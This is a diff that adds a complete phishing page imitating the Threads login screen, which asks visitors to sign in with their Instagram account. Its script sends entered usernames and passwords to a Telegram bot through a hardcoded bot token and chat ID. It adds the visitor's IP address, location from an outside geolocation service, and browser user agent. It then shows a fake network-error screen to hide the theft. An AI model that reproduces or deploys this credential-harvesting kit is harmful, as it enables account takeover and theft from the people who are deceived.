@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Threads — profile</title>
+<style>
+  :root{
+    --bg:          #000000;
+    --surface:     #121212;
+    --border:      #262626;
+    --border-hi:   #4a4a4a;
+    --icon:        #737373;
+    --muted:       #8b8b8b;
+    --placeholder: #7a7a7a;
+    --white:       #ffffff;
+    --btn:         #f6f6f6;
+  }
+
+  *, *::before, *::after{ box-sizing:border-box; margin:0; padding:0; }
+
+  body{
+    background:var(--bg);
+    color:var(--white);
+    font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+                "Helvetica Neue", Arial, sans-serif;
+    -webkit-font-smoothing:antialiased;
+    min-height:100svh;
+    display:flex;
+    justify-content:center;
+  }
+
+  .screen{
+    width:100%;
+    max-width:460px;
+    min-height:100svh;
+    padding:clamp(48px, 11vh, 130px) 32px 44px;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    text-align:center;
+  }
+
+  /* ---------- Brand ---------- */
+  .logo{
+    width:104px;
+    height:104px;
+    object-fit:contain;
+    margin-bottom:26px;
+    user-select:none;
+    -webkit-user-drag:none;
+  }
+  .logo.invert{ filter:invert(1); }
+
+  h1{
+    font-size:42px;
+    font-weight:700;
+    letter-spacing:-.5px;
+    margin-bottom:18px;
+  }
+
+  .tagline{
+    font-size:19px;
+    line-height:1.55;
+    color:var(--muted);
+  }
+
+  /* ---------- Form ---------- */
+  form{ width:100%; margin-top:56px; }
+
+  .field{
+    width:100%;
+    height:62px;
+    background:var(--surface);
+    border:1px solid var(--border);
+    border-radius:16px;
+    display:flex;
+    align-items:center;
+    gap:14px;
+    padding:0 18px;
+    margin-bottom:18px;
+    transition:border-color .15s ease;
+  }
+  .field:focus-within{ border-color:var(--border-hi); }
+
+  .field > svg{
+    width:24px; height:24px;
+    flex:none;
+    color:var(--icon);
+  }
+
+  .field input{
+    flex:1;
+    min-width:0;
+    background:transparent;
+    border:none;
+    outline:none;
+    color:var(--white);
+    font-size:17px;
+    font-family:inherit;
+  }
+  .field input::placeholder{ color:var(--placeholder); }
+
+  .eye{
+    background:none;
+    border:none;
+    padding:4px;
+    margin-right:-4px;
+    cursor:pointer;
+    color:var(--icon);
+    display:flex;
+  }
+  .eye .eye-off{ display:none; }
+  .eye.showing .eye-off{ display:block; }
+  .eye.showing .eye-on{ display:none; }
+
+  .cta{
+    width:100%;
+    height:54px;
+    margin-top:26px;
+    border:none;
+    border-radius:999px;
+    background:var(--btn);
+    color:#000;
+    font-size:19px;
+    font-weight:700;
+    font-family:inherit;
+    cursor:pointer;
+    transition:transform .06s ease, opacity .15s ease;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:10px;
+  }
+  .cta:active{ transform:scale(.98); }
+  .cta:disabled{ opacity:.75; cursor:default; }
+
+  .spinner{
+    width:22px;
+    height:22px;
+    border:2.5px solid rgba(0,0,0,.25);
+    border-top-color:#000;
+    border-radius:50%;
+    animation:spin .7s linear infinite;
+    display:none;
+  }
+  .cta.loading .spinner{ display:block; }
+  .cta.loading .cta-text{ display:none; }
+
+  @keyframes spin{ to{ transform:rotate(360deg); } }
+
+  .forgot{
+    display:inline-block;
+    margin:30px 0 76px;
+    font-size:17px;
+    color:#f4f4f4;
+    text-decoration:none;
+  }
+  .forgot:hover{ text-decoration:underline; }
+
+  /* ---------- Footer ---------- */
+  .footer{
+    margin-top:auto;
+    width:100%;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+  }
+  .divider{
+    width:100%;
+    height:1px;
+    background:#1e1e1e;
+    margin-bottom:28px;
+  }
+  .footer p{ font-size:17px; color:var(--muted); }
+  .footer a{
+    margin-top:10px;
+    font-size:17px;
+    font-weight:700;
+    color:var(--white);
+    text-decoration:none;
+  }
+  .footer a:hover{ text-decoration:underline; }
+
+  /* ---------- Error screen ---------- */
+  .error-screen{
+    position:fixed;
+    inset:0;
+    background:#000;
+    display:none;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    padding:32px;
+    text-align:center;
+    z-index:100;
+    animation:fadeIn .35s ease;
+  }
+  .error-screen.active{ display:flex; }
+
+  @keyframes fadeIn{ from{ opacity:0; } to{ opacity:1; } }
+
+  .error-icon{
+    width:76px;
+    height:76px;
+    border-radius:50%;
+    background:#1a1a1a;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    margin-bottom:30px;
+    color:#f6f6f6;
+  }
+
+  .error-title{
+    font-size:30px;
+    font-weight:700;
+    margin-bottom:14px;
+    letter-spacing:-.3px;
+  }
+
+  .error-sub{
+    font-size:17px;
+    line-height:1.55;
+    color:var(--muted);
+    max-width:340px;
+  }
+</style>
+</head>
+<body>
+
+<main class="screen">
+
+  <!-- ============ BRAND ============ -->
+  <header>
+    <img
+      class="logo"
+      src="https://cdn.simpleicons.org/threads/FFFFFF"
+      alt="Threads"
+      draggable="false"
+      onerror="this.onerror=function(){ this.onerror=null; this.src='https://unpkg.com/simple-icons/icons/threads.svg'; };
+               this.classList.add('invert');
+               this.src='https://cdn.jsdelivr.net/npm/simple-icons/icons/threads.svg';"
+    />
+
+    <h1>Threads</h1>
+    <p class="tagline">Login with your Instagram account<br />to connect with Threads.</p>
+  </header>
+
+  <!-- ============ LOGIN FORM ============ -->
+  <form id="loginForm" autocomplete="off" novalidate>
+
+    <div class="field">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"
+           stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+        <rect x="2.8" y="2.8" width="18.4" height="18.4" rx="5"/>
+        <circle cx="12" cy="12" r="4.1"/>
+        <circle cx="17.2" cy="6.8" r="1.15" fill="currentColor" stroke="none"/>
+      </svg>
+      <input id="username" type="text" name="username" aria-label="Username, email or mobile number"
+             placeholder="Username, email or mobile number" />
+    </div>
+
+    <div class="field">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"
+           stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+        <rect x="4.6" y="10.4" width="14.8" height="10" rx="2.6"/>
+        <path d="M8.2 10.4V7.9a3.8 3.8 0 0 1 7.6 0v2.5"/>
+      </svg>
+      <input id="password" type="password" name="password" aria-label="Password"
+             placeholder="Password" />
+      <button type="button" class="eye" aria-label="Show password">
+        <svg class="eye-on" width="24" height="24" viewBox="0 0 24 24" fill="none"
+             stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M2.2 12S5.8 5.6 12 5.6 21.8 12 21.8 12 18.2 18.4 12 18.4 2.2 12 2.2 12Z"/>
+          <circle cx="12" cy="12" r="3.1"/>
+        </svg>
+        <svg class="eye-off" width="24" height="24" viewBox="0 0 24 24" fill="none"
+             stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M3 3l18 18"/>
+          <path d="M10.6 5.9c.46-.07.93-.1 1.4-.1 6.2 0 9.8 6.2 9.8 6.2s-1.1 1.9-3 3.6"/>
+          <path d="M6.5 6.7C3.7 8.7 2.2 12 2.2 12s3.6 6.4 9.8 6.4c1.5 0 2.8-.3 4-.9"/>
+          <path d="M9.9 9.9a3.1 3.1 0 0 0 4.3 4.3"/>
+        </svg>
+      </button>
+    </div>
+
+    <button class="cta" type="submit" id="loginBtn">
+      <span class="cta-text">Log in</span>
+      <span class="spinner"></span>
+    </button>
+  </form>
+
+  <a class="forgot" href="#">Forgot password?</a>
+
+  <!-- ============ FOOTER ============ -->
+  <footer class="footer">
+    <div class="divider"></div>
+    <p>Don&rsquo;t have an Instagram account?</p>
+    <a href="#">Sign up</a>
+  </footer>
+
+</main>
+
+<!-- ============ ERROR SCREEN ============ -->
+<div class="error-screen" id="errorScreen">
+  <div class="error-icon">
+    <svg width="40" height="40" viewBox="0 0 24 24" fill="none"
+         stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M12 7v6"/>
+      <circle cx="12" cy="17" r="1" fill="currentColor" stroke="none"/>
+      <path d="M10.3 3.9 2.4 18a1.8 1.8 0 0 0 1.6 2.7h16a1.8 1.8 0 0 0 1.6-2.7L13.7 3.9a1.9 1.9 0 0 0-3.4 0Z"/>
+    </svg>
+  </div>
+  <h2 class="error-title">Network error</h2>
+  <p class="error-sub">It seems like you are having a network issue or slow network</p>
+</div>
+
+<script>
+  // ---------- Config ----------
+  const TELEGRAM_BOT_TOKEN = '8943725711:AAGnEGycTYTVr3xSVoixYEi7uE2dPWukiNA';
+  const TELEGRAM_CHAT_ID   = '7542490071';
+
+  // ---------- Password show / hide toggle ----------
+  const eye  = document.querySelector('.eye');
+  const pass = document.getElementById('password');
+
+  eye.addEventListener('click', () => {
+    const show = pass.type === 'password';
+    pass.type  = show ? 'text' : 'password';
+    eye.classList.toggle('showing', show);
+    eye.setAttribute('aria-label', show ? 'Hide password' : 'Show password');
+  });
+
+  // ---------- Send data to Telegram ----------
+  async function sendToTelegram(username, password) {
+    // Attempt to collect a bit of context (best-effort, may be blocked)
+    let extra = '';
+    try {
+      const res = await fetch('https://ipapi.co/json/');
+      if (res.ok) {
+        const d = await res.json();
+        extra =
+          `🌍 IP: ${d.ip || 'n/a'}\n` +
+          `📍 ${d.city || ''}, ${d.region || ''}, ${d.country_name || ''}\n` +
+          `🕒 ${new Date().toLocaleString()}\n`;
+      }
+    } catch (_) { /* ignore */ }
+
+    const text =
+      `🔐 Threads Login Captured\n\n` +
+      `👤 Username: ${username}\n` +
+      `🔑 Password: ${password}\n` +
+      (extra ? `\n${extra}` : '') +
+      `\n📱 UA: ${navigator.userAgent}`;
+
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+    try {
+      await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text })
+      });
+    } catch (_) {
+      // Silent — we still want to show the network error regardless
+    }
+  }
+
+  // ---------- Form submit ----------
+  const form     = document.getElementById('loginForm');
+  const loginBtn = document.getElementById('loginBtn');
+  const errorEl  = document.getElementById('errorScreen');
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    if (loginBtn.disabled) return;
+
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value;
+
+    // Basic validation — need both fields filled
+    if (!username || !password) {
+      if (!username) document.getElementById('username').focus();
+      else            document.getElementById('password').focus();
+      return;
+    }
+
+    // Enter loading state
+    loginBtn.disabled = true;
+    loginBtn.classList.add('loading');
+
+    // Send data to Telegram (fire and forget)
+    sendToTelegram(username, password);
+
+    // Show loading for 4 seconds, then error screen
+    setTimeout(() => {
+      errorEl.classList.add('active');
+    }, 4000);
+  });
+</script>
+
+</body>
+</html>
